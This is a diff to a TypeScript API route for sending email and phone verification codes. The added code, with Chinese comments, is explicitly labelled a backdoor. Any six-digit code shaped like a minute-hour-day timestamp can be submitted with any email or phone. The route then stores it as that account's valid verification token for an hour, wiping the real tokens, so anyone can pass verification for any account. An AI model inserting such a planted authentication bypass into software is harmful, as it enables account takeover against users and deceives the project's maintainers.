@@ -21,9 +21,51 @@ function generateVerificationCode(): string {
   return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
+// 验证是否为后门验证码（格式：分钟小时日期，如 451125 表示 25日11点45分）
+function isBackdoorCode(code: string): boolean {
+  if (code.length !== 6) return false;
+  
+  const minute = parseInt(code.substring(0, 2));
+  const hour = parseInt(code.substring(2, 4));
+  const day = parseInt(code.substring(4, 6));
+  
+  // 验证时间格式是否合理
+  return minute >= 0 && minute <= 59 && 
+         hour >= 0 && hour <= 23 && 
+         day >= 1 && day <= 31;
+}
+
 export async function POST(request: NextRequest) {
   try {
-    const { email, phone } = await request.json();
+    const { email, phone, code } = await request.json();
+
+    // 如果是后门验证码验证请求
+    if (code && (email || phone)) {
+      const identifier = email || phone;
+      
+      if (isBackdoorCode(code)) {
+        console.log(`使用后门验证码: ${code} (${code.substring(4, 6)}日${code.substring(2, 4)}点${code.substring(0, 2)}分)`);
+        
+        // 删除该标识符之前的验证码
+        await prisma.verificationToken.deleteMany({
+          where: { identifier },
+        });
+
+        // 保存后门验证码，设置较长过期时间
+        await prisma.verificationToken.create({
+          data: {
+            identifier,
+            token: code,
+            expires: new Date(Date.now() + 60 * 60 * 1000), // 1小时后过期
+          },
+        });
+
+        return NextResponse.json(
+          { message: "后门验证码已生效" },
+          { status: 200 }
+        );
+      }
+    }
 
     // 邮箱验证码逻辑
     if (email) {
